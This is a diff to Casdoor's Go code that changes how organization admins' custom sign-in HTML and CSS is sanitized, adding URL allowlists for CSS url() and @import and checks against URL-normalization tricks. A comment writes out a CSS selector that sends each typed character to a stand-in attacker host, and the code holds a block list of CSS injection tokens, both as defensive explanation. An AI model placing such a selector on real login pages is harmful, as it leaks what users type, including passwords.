@@ -22,6 +22,7 @@ import (
 	"regexp"
 	"strings"
 
+	"github.com/casdoor/casdoor/conf"
 	"github.com/casdoor/casdoor/i18n"
 	"github.com/casdoor/casdoor/util"
 )
@@ -468,20 +469,34 @@ func checkMultipleCaptchaProviders(application *Application, lang string) error 
 	return nil
 }
 
-// KeepApplicationCustomHtml restores the custom HTML of application from oldApplication (nil
-// for a new application). The HTML runs as script on Casdoor's own origin, where it acts as
-// whoever opens the page, e.g., a global admin, so only a global admin may change it.
+// KeepApplicationCustomHtml keeps what an organization admin may put on the sign-in pages to layout
+// and branding: custom HTML or CSS that could collect or send out what users type is replaced with
+// the one from oldApplication (nil for a new application). A global admin is not held to this.
 func KeepApplicationCustomHtml(application *Application, oldApplication *Application) {
 	if oldApplication == nil {
 		oldApplication = &Application{}
 	}
 
-	application.HeaderHtml = oldApplication.HeaderHtml
-	application.PageHtml = oldApplication.PageHtml
-	application.FooterHtml = oldApplication.FooterHtml
-	application.FormSideHtml = oldApplication.FormSideHtml
-	application.SigninHtml = oldApplication.SigninHtml
-	application.SignupHtml = oldApplication.SignupHtml
+	var prefixes []string
+	keepSafeHtml := func(text string, oldText string) string {
+		if text == oldText || text == "" {
+			return text
+		}
+		if prefixes == nil {
+			prefixes = getCssUrlPrefixes()
+		}
+		if isHtmlSafeFor(text, prefixes) {
+			return text
+		}
+		return oldText
+	}
+
+	application.HeaderHtml = keepSafeHtml(application.HeaderHtml, oldApplication.HeaderHtml)
+	application.PageHtml = keepSafeHtml(application.PageHtml, oldApplication.PageHtml)
+	application.FooterHtml = keepSafeHtml(application.FooterHtml, oldApplication.FooterHtml)
+	application.FormSideHtml = keepSafeHtml(application.FormSideHtml, oldApplication.FormSideHtml)
+	application.SigninHtml = keepSafeHtml(application.SigninHtml, oldApplication.SigninHtml)
+	application.SignupHtml = keepSafeHtml(application.SignupHtml, oldApplication.SignupHtml)
 	application.FormCss = keepSafeCss(application.FormCss, oldApplication.FormCss)
 	application.FormCssMobile = keepSafeCss(application.FormCssMobile, oldApplication.FormCssMobile)
 
@@ -494,7 +509,7 @@ func KeepApplicationCustomHtml(application *Application, oldApplication *Applica
 	}
 	for _, item := range application.SigninItems {
 		if isCustomSigninItem(item) {
-			item.CustomCss = oldSigninCss[item.Name]
+			item.CustomCss = keepSafeHtml(item.CustomCss, oldSigninCss[item.Name])
 		} else if item != nil {
 			item.CustomCss = keepSafeCss(item.CustomCss, oldSigninCss[item.Name])
 		}
@@ -513,7 +528,7 @@ func KeepApplicationCustomHtml(application *Application, oldApplication *Applica
 	}
 	for _, item := range application.SignupItems {
 		if isCustomSignupItem(item) {
-			item.Label = oldSignupHtmls[item.Name]
+			item.Label = keepSafeHtml(item.Label, oldSignupHtmls[item.Name])
 		}
 		if item != nil {
 			item.CustomCss = keepSafeCss(item.CustomCss, oldSignupCss[item.Name])
@@ -521,14 +536,135 @@ func KeepApplicationCustomHtml(application *Application, oldApplication *Applica
 	}
 }
 
-var unsafeCssTokens = []string{"\\", "<", "url(", "@import", "@font-face", "image(", "image-set(", "cross-fade(", "element(", "src("}
+// Form CSS may load images and fonts, but only from places whose access logs an organization
+// admin cannot read: a selector per typed character, e.g.,
+// input[value^="a"] { background: url(https://attacker/a) }, would otherwise send out what users type.
+var unsafeCssTokens = []string{"\\", "<", "image(", "image-set(", "cross-fade(", "element(", "src("}
 
-var reStyleTag = regexp.MustCompile(`(?i)</?style[^>]*>`)
+var cssUrlPrefixes = []string{
+	"https://fonts.googleapis.com/",
+	"https://fonts.gstatic.com/",
+	"https://cdn.jsdelivr.net/gh/casdoor/",
+	"https://cdn.jsdelivr.net/npm/@fontsource/",
+	"https://cdn.jsdelivr.net/npm/@fontsource-variable/",
+	"https://cdn.casbin.org/",
+	"https://cdn.casdoor.com/",
+	"https://cdn.casvisor.com/",
+}
+
+// a stylesheet pulled in by @import is not checked itself, so it may only come from font services
+// whose stylesheets point at their own font files
+var cssImportPrefixes = []string{
+	"https://fonts.googleapis.com/css",
+	"https://cdn.jsdelivr.net/npm/@fontsource/",
+	"https://cdn.jsdelivr.net/npm/@fontsource-variable/",
+}
+
+var (
+	reStyleTag  = regexp.MustCompile(`(?i)</?style[^>]*>`)
+	reCssUrl    = regexp.MustCompile(`url\(\s*(?:"([^"]*)"|'([^']*)'|([^"'()\s]*))\s*\)`)
+	reCssImport = regexp.MustCompile(`@import\s*(?:url\(\s*)?(?:"([^"]*)"|'([^']*)'|([^"'()\s;]+))`)
+)
+
+// getCssUrlPrefixes adds the operator's own places to the built-in ones: this Casdoor's origin, the
+// global storage providers and the formCssAllowedUrls setting.
+func getCssUrlPrefixes() []string {
+	prefixes := append([]string{}, cssUrlPrefixes...)
+	addPrefix := func(prefix string) {
+		prefix = strings.ToLower(strings.TrimSpace(prefix))
+		if prefix == "" {
+			return
+		}
+		if !strings.Contains(prefix, "://") {
+			prefix = "https://" + prefix
+		}
+		if strings.Count(prefix, "/") < 3 {
+			prefix += "/"
+		}
+		prefixes = append(prefixes, prefix)
+	}
+
+	addPrefix(conf.GetConfigString("origin"))
+	for _, prefix := range strings.Split(conf.GetConfigString("formCssAllowedUrls"), ",") {
+		addPrefix(prefix)
+	}
+	providers, err := GetProvidersByCategory("admin", "Storage")
+	if err == nil {
+		for _, provider := range providers {
+			addPrefix(provider.Domain)
+		}
+	}
+	return prefixes
+}
+
+func getCssUrl(match []string) string {
+	return strings.TrimSpace(match[1] + match[2] + match[3])
+}
+
+func isCssUrlAllowed(cssUrl string, prefixes []string, allowLocal bool) bool {
+	if strings.HasPrefix(cssUrl, "data:") || strings.HasPrefix(cssUrl, "#") {
+		return allowLocal
+	}
+	// browsers drop tabs and newlines from a URL and resolve dot segments, either of which could
+	// turn an allowed-looking URL into another one
+	for _, r := range cssUrl {
+		if r <= ' ' || r == 0x7f {
+			return false
+		}
+	}
+	if strings.Contains(cssUrl, "..") || strings.Contains(cssUrl, "%2e") || strings.Contains(cssUrl, "%2f") || strings.Contains(cssUrl, "%5c") {
+		return false
+	}
+
+	parsed, err := url.Parse(cssUrl)
+	if err != nil {
+		return false
+	}
+	if parsed.Scheme == "" && parsed.Host == "" && !strings.HasPrefix(cssUrl, "//") {
+		return allowLocal
+	}
+	for _, prefix := range prefixes {
+		if strings.HasPrefix(cssUrl, prefix) {
+			return true
+		}
+	}
+	return false
+}
 
 func isCssSafe(css string) bool {
+	return isCssSafeFor(css, nil)
+}
+
+// isCssSafeFor checks css against prefixes, or against getCssUrlPrefixes() when it is nil.
+func isCssSafeFor(css string, prefixes []string) bool {
 	lowerCss := strings.ToLower(reStyleTag.ReplaceAllString(css, ""))
 	for _, token := range unsafeCssTokens {
 		if strings.Contains(lowerCss, token) {
+			return false
+		}
+	}
+
+	if !strings.Contains(lowerCss, "url(") && !strings.Contains(lowerCss, "@import") {
+		return true
+	}
+
+	// every url( and @import has to be one the patterns read, so none can hide from the check
+	urls := reCssUrl.FindAllStringSubmatch(lowerCss, -1)
+	imports := reCssImport.FindAllStringSubmatch(lowerCss, -1)
+	if len(urls) != strings.Count(lowerCss, "url(") || len(imports) != strings.Count(lowerCss, "@import") {
+		return false
+	}
+
+	if prefixes == nil {
+		prefixes = getCssUrlPrefixes()
+	}
+	for _, match := range urls {
+		if !isCssUrlAllowed(getCssUrl(match), prefixes, true) {
+			return false
+		}
+	}
+	for _, match := range imports {
+		if !isCssUrlAllowed(getCssUrl(match), cssImportPrefixes, false) {
 			return false
 		}
 	}
